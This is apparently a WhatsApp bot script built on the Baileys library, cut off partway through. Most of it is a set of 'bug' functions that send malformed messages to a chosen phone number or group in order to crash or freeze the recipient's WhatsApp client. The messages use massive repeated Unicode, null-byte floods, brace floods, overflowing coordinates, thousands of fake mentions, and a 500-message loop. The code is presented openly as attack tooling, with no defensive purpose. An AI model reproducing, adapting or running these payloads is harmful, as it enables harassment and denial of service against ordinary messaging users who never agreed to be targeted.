// "@whiskeysockets/baileys": "github:Bealllevey62/xatabail"

require('../setting/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const ms = require("parse-ms");
const fetch = require("node-fetch");
const JsConfuser = require('js-confuser');
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia, downloadContentFromMessage } = require("@whiskeysockets/baileys");

module.exports = ciciimup = async (ciciimup, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? ciciimup.user.id.split(":")[0] + "@s.whatsapp.net" || ciciimup.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));

const botNumber = await ciciimup.decodeJid(ciciimup.user.id);
const Access = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCmd = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// Group function
const groupMetadata = isGroup ? await ciciimup.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunction');
    
const _prem = require("./lib/premium");
const isPremium = Access ? true : _prem.checkPremiumUser(m.sender);

// Foto
let cihuy = fs.readFileSync('./cicitzy/cici-clyriné.jpg')
// Time
const time = moment.tz("Asia/Makassar").format("HH:mm:ss");


// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
`   ⌬ Pesan: ${m.body || m.mtype} \n` +
`   ⌬ Pengirim: ${m.pushname} \n` +
`   ⌬ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Grup: ${groupName} \n` +
`   ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}
    
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

const RC = fs.readFileSync('./cicitzy/cici-clyriné.jpg')
const ciciimupreply = async (teks) => {
  return ciciimup.sendMessage(m.chat, {
    contextInfo: {
      mentionedJid: [m.sender],
      externalAdReply: {
        showAdAttribution: false, // Nonaktifkan karena sering menyebabkan kompatibilitas issues
        renderLargerThumbnail: false, // Gunakan thumbnail yang lebih besar untuk kompatibilitas
        title: `SIGMA͢GIRL V1.0`,
        body: `MUZAN SIGMA`,
        previewType: "PHOTO", // Sesuaikan dengan tipe media (gambar)
        thumbnail: RC,
        sourceUrl: `https://whatsapp.com/channel/0029VbBIAP58KMqoJluW8r06`,
        mediaUrl: `https://files.catbox.moe/jqen9o.png`
      }
    },
    text: teks
  }, {
    quoted: m
  })
}


const bugres = '*</> sigma girl in processs 🌸 </>*'

/* ============================================= cicitzy imup ===============================================*/
 async function uiKiller(target) {
  await ciciimup.relayMessage(target, 
    {
      locationMessage: {
        degreesLongitude: 0,
        degreesLatitude: 0,
        name: "𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟" + "ི꒦ྀ".repeat(9000), 
        url: "https://null.com" +  "ི꒦ྀ".repeat(9000) + ".id", 
        address:  "𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟" + "ི꒦ྀ".repeat(9000), 
        contextInfo: {
          externalAdReply: {
            renderLargerThumbnail: true, 
            showAdAttribution: true, 
            body:  "𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟", 
            title: "ི꒦ྀ".repeat(9000), 
            sourceUrl: "https://ciciimup.com" +  "ི꒦ྀ".repeat(9000) + ".id",  
            thumbnailUrl: null, 
            quotedAd: {
              advertiserName: "ི꒦ྀ".repeat(9000), 
              mediaType: 2,
              jpegThumbnail: "/9j/4AAKossjsls7920ljspLli", 
              caption: "-( null )-", 
            }, 
            pleaceKeyHolder: {
              remoteJid: "0@s.whatsapp.net", 
              fromMe: false, 
              id: "ABCD1234567"
            }
          }
        }
      }
    }, 
  {});
}

async function DocBug(target) {
 let virtex = "𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟";
   ciciimup.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "@null" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };

async function LocaBugs(target) {
 await ciciimup.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟`+'ꦾ'.repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "@null" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await ciciimup.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function stikerNotif(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "@null",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(1000000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(7000),
                },
                
              ],
            },
          },
        },
      },
    };

    await ciciimup.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}

async function delayNull(target) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      body: {
        text: "𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"AGLER\",\"tower_number\":\"AGLER\",\"city\":\"@null\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, { userJid:target });
  
  await ciciimup.relayMessage(target, msg.message, {
    participant: { jid:target }, 
    messageId: msg.key.id
  }) 
}

async function ForceClose2(target) {
  for (let i = 0; i < 1; i++) {
  const teks = `\`𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟\``+"ꦾ".repeat(550);
  const image = 'https://files.catbox.moe/f4kqyq.jpg';
  const agler = `\`attack system ${target}\``
  await ciciimup.relayMessage(target, {
  image: { url: image },
  caption: teks
  }, { participant: { jid: target } });

   let buttons = [
   {buttonId: '120363372721190301@newsletter', buttonText:
   {displayText: '𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟'},
   type: 1}
   ]
   let buttonMessage = {
     image: { url: image },
     caption: teks,
     buttons: buttons,
     headerType: 4
   }
   await ciciimup.relayMessage(target,
   buttonMessage, { participant: { jid: target } });

   await ciciimup.sendMessage(m.chat, {
    image: { url: image },
    caption: agler
   }, { quoted: m });

  console.log(chalk.blue('attack force close'))
    }
   }

async function CrashGroup(target) {
  for (let i = 0; i < 500; i++) {
  const teks = `\`𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟\``+"ꦾ".repeat(780);
  const image = 'https://files.catbox.moe/f4kqyq.jpg';
  await ciciimup.relayMessage(target, {
  image: { url: image },
  caption: teks
  }, { participant: { jid: target } });

   let buttons = [
   {buttonId: '.bug-gb', buttonText:
   {displayText: '𐎟🌸⃝⃝𝐕𝐢𝐥𝐞͢𝐬𝐭𝐚𒁂𝐜𝐢𝐜𝐢͢ 𝐜𝐥𝐲𝐫𝐢𝐧𝐞́͢ 🎀⃝⃝𐎟'},
   type: 1}
   ]
   let buttonMessage = {
     image: { url: image },
     caption: teks,
     buttons: buttons,
     headerType: 4
   }

   await ciciimup.sendMessage(m.chat, {
    image: { url: image },
    caption: teks
   }, { quoted: m });

   await ciciimup.sendMessage(m.chat, buttonMessage, { quoted: m })
  console.log(chalk.blue('attack force close'))
    }
   }

// FUNCTION FORCE CLOSE
async function vilestaFC(target) {
for (let r = 0; r < 1; r++) {
try {
let msg = await generateWAMessageFromContent(
  target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
          header: {
            title: "",
              hasMediaAttachment: false,
              locationMessage: {
              degreesLatitude: 1e309,
              degreesLongitude: -1e309,
              name: '{'.repeat(50000),
              address: '{'.repeat(50000),
              },
            },
           contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "X",
            mentionedJid: [" 0@s.whatsapp.net"]
          },
            body: {
              text: "vilesta.js",
            },
            nativeFlowMessage: {
              messageParamsJson: '{'.repeat(50000),
            },
          },
        },
      },
    },
    {}
  );
  await ciciimup.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
} catch (err) {
console.log("Error Sending Bug", err);
}
console.log("vilesta send force close")
}
}
async function DocFC(target) {
  for (let r = 0; r < 1; r++) {
    try {
      let msg = await generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "vilesta Anjay",
                  hasMediaAttachment: false,
                  locationMessage: {
                    degreesLatitude: 999999999,
                    degreesLongitude: -999999999,
                    name: '{'.repeat(100000),
                    address: '{'.repeat(100000),
                  },
                },
                contextInfo: {
                  participant: "0@s.whatsapp.net",
                  remoteJid: "X",
                  mentionedJid: ["0@s.whatsapp.net"]
                },
                body: {
                  text: "vilesta.js",
                },
                nativeFlowMessage: {
                  messageParamsJson: '{'.repeat(100000),
                },
              },
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
                fileSha256: Buffer.from("ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=", "base64"),
                fileLength: "974197419741",
                pageCount: "974197419741",
                mediaKey: Buffer.from("5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=", "base64"),
                fileName: "𝄽̸̷̷̸̛̽͢͟͠͞͡͏́͢͟͡".repeat(70),
                fileEncSha256: Buffer.from("pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=", "base64"),
                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173"
              }
            }
          }
        },
        {}
      );
      await ciciimup.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
      });
    } catch (err) {
      console.log("Error Sending Bug:", err);
    }
    console.log("Succesfuly Sending Bug");
  }
}
async function PrePortDoc(target) {
  try {
    let message = proto.Message.fromObject({
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫͢𝐢𝐩𝐭ͮ͢ཀ͜͡🎀",
              hasMediaAttachment: false,
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                mimetype: "penis",
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "99999999",
                pageCount: 9999,
                 mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: "",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173",
              },
            },
            body: {
              text: "🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫͢𝐢𝐩𝐭ͮ͢ཀ͜͡🎀",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 50000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    });

    await ciciimup.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

async function cicitzyFC1(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫͢𝐢𝐩𝐭ͮ͢ཀ͜͡🎀',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫͢𝐢𝐩𝐭ͮ͢ཀ͜͡🎀"
                },
                footer: {
                  text: "cicitzy.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(20000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ cicitzy.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await ciciimup.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.green(`Successfully Send ${chalk.red("Bug")} to ${target}`))
}

async function cicitzyFC2(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫͢𝐢𝐩𝐭ͮ͢ཀ͜͡🎀',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089",
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true, 
                },
                body: { 
                  text: "🌸⃟༑⌁⃰𝐕𝐢𝐥͢𝐞𝐬𝐭𝐚 𝐒𝐜𝐫͢𝐢𝐩𝐭ͮ͢ཀ͜͡🎀"
                },
                footer: {
                  text: "cicitzy.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(20000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ phynx.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await ciciimup.relayMessage("status@broadcast", msg, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
                tag: "to",
                attrs: {
                    jid: target
                },
                content: undefined
            }]
        }]
    }]
});
console.log(chalk.green(`Successfully Send ${chalk.red("CursorCrl")} to ${target}`))
}

async function UiCallCrashBlank(target) {
  const msgUiCall = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "cicitzy.zip" + "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "call_permission_request", buttonParamsJson: "" }
              ]
            }
          }
        }
      }
    },
    {}
  );
  await ciciimup.relayMessage(target, msgUiCall.message, {
    participant: { jid: target },
    messageId: msgUiCall.key.id
  });

  const spamMention = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
  const teks = "᬴".repeat(250000);

  const callUiMsg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
